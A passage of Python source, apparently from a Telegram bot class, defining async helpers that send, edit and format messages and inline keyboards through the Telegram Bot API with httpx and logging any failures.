                    await self._send_telegram_message(chat_id, f"❌ <b>Failed to send file:</b> {error_msg}")

        except Exception as e:
            logger.error(f"[FILE] Error: {e}")
            await self._send_telegram_message(chat_id, f"❌ <b>Error sending file:</b> {str(e)}")
        finally:
            self.downloading_files.pop(download_key, None)
    
    async def _send_telegram_message(self, chat_id: str, text: str):
        """Send a message to Telegram chat"""
        bot_token = getattr(self.config, 'telegram_bot_token', '')
        
        if not bot_token:
            return
        
        # Natural-text formatting: bold highlights, clickable links,
        # regular weight on values.  No monospace, no ASCII frame --
        # the eye is guided by bolded labels instead of a uniform
        # block of fake-monospace glyphs.
        formatted_text = format_telegram_html(text, use_bold=True, convert_links=True)
        
        # Sanitize text for Telegram
        sanitized_text = sanitize_for_telegram_simple(formatted_text)
        
        try:
            async with httpx.AsyncClient(timeout=10.0) as client:
                url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
                payload = {
                    "chat_id": chat_id,
                    "text": sanitized_text,
                    "parse_mode": "HTML",
                    "disable_web_page_preview": True,
                }
                response = await client.post(url, json=payload)

                if response.status_code != 200:
                    logger.warning(f"[TELEGRAM] Send failed: {response.status_code}")
        except Exception as e:
            logger.warning(f"[TELEGRAM] Send error: {e}")
    
    async def _send_telegram_inline_keyboard(self, chat_id: str, text: str, keyboard: list):
        """Send a message with inline keyboard to Telegram chat"""
        bot_token = getattr(self.config, 'telegram_bot_token', '')
        
        if not bot_token:
            return
        
        # Natural-text formatting with bold highlights and clickable
        # links.  No monospace, no ASCII frame.
        formatted_text = format_telegram_html(text, use_bold=True, convert_links=True)
        
        # Sanitize text for Telegram
        sanitized_text = sanitize_for_telegram_simple(formatted_text)
        
        try:
            async with httpx.AsyncClient(timeout=10.0) as client:
                url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
                payload = {
                    "chat_id": chat_id,
                    "text": sanitized_text,
                    "parse_mode": "HTML",
                    "disable_web_page_preview": True,
                    "reply_markup": {"inline_keyboard": keyboard}
                }
                response = await client.post(url, json=payload)

                if response.status_code != 200:
                    logger.warning(f"[TELEGRAM] Inline keyboard failed: {response.status_code}")
        except Exception as e:
            logger.warning(f"[TELEGRAM] Inline keyboard error: {e}")
    
    async def _edit_telegram_message(self, chat_id: str, message_id: int, text: str):
        """Edit an existing message text"""
        bot_token = getattr(self.config, 'telegram_bot_token', '')
        
        if not bot_token:
            return
        
        # Natural-text formatting with bold highlights and clickable
        # links.  No monospace, no ASCII frame.
        formatted_text = format_telegram_html(text, use_bold=True, convert_links=True)
        
        # Sanitize text for Telegram
        sanitized_text = sanitize_for_telegram_simple(formatted_text)
        
        try:
            async with httpx.AsyncClient(timeout=10.0) as client:
                url = f"https://api.telegram.org/bot{bot_token}/editMessageText"
                payload = {
                    "chat_id": chat_id,
                    "message_id": message_id,
                    "text": sanitized_text,
                    "parse_mode": "HTML",
                    "disable_web_page_preview": True,
                }
                response = await client.post(url, json=payload)

                if response.status_code != 200:
                    logger.warning(f"[TELEGRAM] Edit failed: {response.status_code}")
        except Exception as e:
            logger.warning(f"[TELEGRAM] Edit error: {e}")
    
    async def _edit_telegram_inline_keyboard(self, chat_id: str, message_id: int, text: str, keyboard: list):
        """Edit an existing message with inline keyboard"""
        bot_token = getattr(self.config, 'telegram_bot_token', '')
        
        if not bot_token:
            return
        
        sanitized_text = sanitize_for_telegram_simple(text)
        
        try:
            async with httpx.AsyncClient(timeout=10.0) as client:
                url = f"https://api.telegram.org/bot{bot_token}/editMessageReplyMarkup"
                payload = {
                    "chat_id": chat_id,
                    "message_id": message_id,
                    "reply_markup": {"inline_keyboard": keyboard}
                }
                response = await client.post(url, json=payload)
                
                if response.status_code != 200:
                    logger.warning(f"[TELEGRAM] Keyboard edit failed: {response.status_code}")
        except Exception as e:
            logger.warning(f"[TELEGRAM] Keyboard edit error: {e}")
    
    async def _answer_callback_query(self, callback_query_id: str, text: str = ""):
        """Answer a callback query to remove loading state"""
        bot_token = getattr(self.config, 'telegram_bot_token', '')
        
        if not bot_token:
            return
        
        try:
            async with httpx.AsyncClient(timeout=10.0) as client:
                url = f"https://api.telegram.org/bot{bot_token}/answerCallbackQuery"
                payload = {
                    "callback_query_id": callback_query_id,
                    "text": text
                }
                await client.post(url, json=payload)
        except Exception as e:
            logger.debug(f"[CALLBACK] Answer error: {e}")
